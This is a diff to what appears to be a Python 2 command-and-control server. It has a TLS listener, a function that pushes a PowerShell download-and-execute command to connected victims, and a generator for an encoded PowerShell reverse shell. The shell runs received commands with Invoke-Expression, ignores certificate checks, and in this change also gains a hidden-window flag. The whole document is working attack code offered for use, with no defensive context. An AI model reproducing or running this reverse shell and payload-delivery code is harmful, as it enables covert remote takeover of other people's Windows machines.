@@ -17,7 +17,7 @@ def startListener():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
-        ws.listen(5)
+        ws.listen(10)
         print t.bold_red + "listening on port 5555" + t.normal
 
         startWorker = True
@@ -69,26 +69,33 @@ def interactShell(clientconn,clientnumber):
     return True
 
 
-def clientUpload(fileToUpload,clientconn):
-    print t.bold_green + "[*] Starting Transfer" + t.normal
-    ipaddr = FUNCTIONS().CheckInternet()
-    FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
-    clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 15;Start-Process \"$Env:TEMP\\temp.exe\"")
+def clientUpload(fileToUpload,clientconn,powershellExec):
+    print type(fileToUpload)
+    if powershellExec:
+        clientconn.sendall(powershellExec)
+    else:
+        print type(fileToUpload)
+        fileToUpload += '.exe'
+        print t.bold_green + "[*] Starting Transfer" + t.normal
+        ipaddr = FUNCTIONS().CheckInternet()
+        FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
+        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 15;Start-Process \"$Env:TEMP\\temp.exe\"")
 
 def printListener():
     windows_ps_rev_shell = (
+        "[System.Security.Authentication.SslProtocols]$protocol = 'tls';"
         "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
         "$stream = $client.GetStream();"
         "[byte[]]$bytes = 0..65535|%{0};"
         "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$sslstream.AuthenticateAsClient('10.131.101.65');"
+        "$sslstream.AuthenticateAsClient('10.131.101.65',$null,$protocol,$false);"
         "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
         "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
         "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
         "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
         "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
         "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
-    print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
+    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
     return True
 
 def pingClients(clientconn,clientnumber):
